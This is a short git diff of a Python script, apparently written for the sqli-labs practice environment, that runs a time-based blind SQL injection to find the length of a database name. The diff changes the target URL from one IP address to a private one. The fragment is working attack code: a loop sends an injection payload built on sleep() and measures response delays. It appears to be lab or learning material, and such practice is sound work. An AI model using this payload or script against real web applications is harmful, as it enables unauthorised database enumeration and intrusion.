@@ -7,7 +7,7 @@ import requests
 # 获取数据库名长度
 def database_len():
     for i in range(1, 10):
-        url = "http://180.21.14.254:8080/Less-9/index.php"
+        url = "http://192.168.127.144:83/Less-8/index.php"
         payload = " ?id=1' and if(length(database())>%s,sleep(1),0) --+" % i
         # print(url+payload+'%23')
         time1 = datetime.datetime.now()
